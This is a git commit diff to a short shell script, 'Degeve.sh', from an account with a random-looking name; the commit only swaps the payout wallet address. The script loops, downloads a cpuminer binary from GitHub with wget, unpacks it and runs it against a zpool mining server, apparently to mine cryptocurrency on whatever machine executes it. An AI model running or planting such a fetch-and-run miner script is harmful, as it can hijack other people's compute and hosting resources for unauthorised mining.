5cff1f5e8bee6844983917e2842f1177ef6da331
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-05-08 08:43:30 +0700

    Update Degeve.sh

--- Degeve.sh
+++ Degeve.sh
@@ -3,7 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
             
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB -t 2
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D6ph2BjEmY1BB558NXcasUgTbxvmg7HH2E -p c=DGB -t 2
 
      echo COUNTER $COUNTER
      let COUNTER-=1
